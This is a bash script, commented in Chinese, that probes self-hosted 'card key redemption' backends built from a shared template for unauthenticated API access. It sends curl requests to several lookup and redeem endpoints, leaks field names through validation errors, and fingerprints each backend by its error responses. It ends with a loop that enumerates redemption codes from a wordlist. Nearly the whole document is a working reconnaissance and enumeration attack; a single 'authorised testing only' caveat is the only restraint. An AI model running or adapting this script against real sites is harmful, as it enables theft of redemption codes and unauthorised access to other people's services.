#!/usr/bin/env bash
# 卡密兑换中心自托管后端 —— 未授权卡密查询/枚举探测
# 适用：gptcdk 同源码卡密站群（app.js 内含 DEFAULT_API_BASE 常量、「★★★ 配置区」注释）
# 该模板站群各自部署自托管后端，接口普遍无鉴权
set -u
TARGET="${1:-https://203.0.113.93}"
CODE="${2:-TEST1234}"
UA='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0 Safari/537.36'

echo "[1] GET result-by-code（部分实现无格式校验，直接查库）"
curl -s -i --max-time 12 -A "$UA" "$TARGET/api/v1/public/cdk/result-by-code?code=$CODE" | head -12
echo
echo "[2] GET lookup/cdk（另一实现）"
curl -s -i --max-time 12 -A "$UA" "$TARGET/api/v1/lookup/cdk?code=$CODE" | head -12
echo
echo "[3] POST cdk/lookup（返回完整卡密对象：status/plan/plan_key/can_redeem/order）"
curl -s -i --max-time 12 -A "$UA" -X POST "$TARGET/api/v1/cdk/lookup" \
  -H 'Content-Type: application/json' -d "{\"code\":\"$CODE\"}" | head -14
echo
echo "[4] POST cdk/redeem-account（FastAPI 实现，字段经 422 泄露：code + account_email）"
curl -s -i --max-time 12 -A "$UA" -X POST "$TARGET/api/v1/cdk/redeem-account" \
  -H 'Content-Type: application/json' -d '{}' | head -10
echo
echo "[5] 路由判定要点"
echo "  · 405 + {\"detail\":\"Method Not Allowed\"}  → FastAPI 实现（203.0.113.89）"
echo "  · 405 + allow: POST                        → FastAPI 路由确认"
echo "  · {\"ok\":false,\"error\":{\"code\":\"method_not_allowed\"}} → 自研 REST（203.0.113.92）"
echo "  · {\"code\":404,\"msg\":\"not found\"}(33B) vs 业务消息(60B) → 用于区分真实路由与兜底 404"
echo
echo "[6] 枚举（谨慎：会产生撞库流量，仅限授权测试）"
echo "  for c in \$(cat codes.txt); do"
echo "    curl -s \"$TARGET/api/v1/public/cdk/result-by-code?code=\$c\" | grep -v '没有查到' && echo \"HIT \$c\";"
echo "    sleep 1; done"